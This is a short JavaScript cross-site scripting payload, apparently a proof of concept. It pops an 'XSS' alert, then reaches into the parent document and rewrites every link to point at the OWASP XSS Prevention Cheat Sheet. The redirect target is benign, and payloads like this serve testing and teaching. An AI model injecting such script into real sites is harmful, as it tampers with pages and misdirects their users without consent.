alert(`XSS`);
const ele=parent.document.getElementsByTagName(`a`);
for(let i=0;i<ele.length;i++){
ele[i].href=`https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html`;
}
